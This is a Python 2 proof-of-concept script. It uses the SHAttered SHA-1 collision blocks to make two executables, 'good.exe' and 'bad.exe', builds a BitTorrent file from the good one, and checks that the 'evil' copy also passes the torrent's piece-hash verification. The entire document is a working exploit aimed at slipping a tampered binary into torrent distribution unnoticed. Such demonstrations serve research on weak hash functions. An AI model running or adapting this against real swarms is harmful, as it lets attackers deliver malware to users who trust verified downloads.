import os
import ntpath
import sys
from hashlib import sha1
from shatteredData import shattered1, shattered2
from generateTorrent import readFileData, writeFileData, generateTorrentFile, verifyTorrentFile

def replaceCollisionData(data, chunksize):
	marker = data.find(shattered1[:0x0F])
	if marker == -1:
		print '[-] Marker not found! Exiting!'
		sys.exit()
	sectionend   = marker+512+512
	sectionstart = marker-512

	goodfile = data[:marker] + shattered1 + data[sectionend-512:]
	badfile = data[:marker] + shattered2 + data[sectionend-512:]
		
	return (goodfile, badfile)
	
	
if __name__ == "__main__":

	outputdirectory = 'replacement_test/'
	torrentfilename = 'output.torrent'
	tracker = 'http://tracker.opentrackr.org:1337/announce'
	inputfile = 'TwoFace.exe'
	chunksize = 512
	
	data= readFileData('TwoFace.exe')
	gooddata, evildata = replaceCollisionData(data,512)
	writeFileData(gooddata,'replacement_test/good.exe')
	writeFileData(evildata, 'replacement_test/bad.exe')
	
	torrent = generateTorrentFile(gooddata, 'good.exe', chunksize, tracker)
	writeFileData(torrent, os.path.join(outputdirectory, ntpath.basename(inputfile)+'.torrent'))
	print '[+] Checking if everything is okay'
	if sha1(gooddata).digest() == sha1(evildata).digest():
		print '[-] This is so unlikely even Google culd only do it once!'
		sys.exit()
	print '[+] Checking gooddata - torrnet validity...'
	print verifyTorrentFile(gooddata, torrent)
	print '[+] Checking evildata - torrnet validity'
	print verifyTorrentFile(evildata, torrent)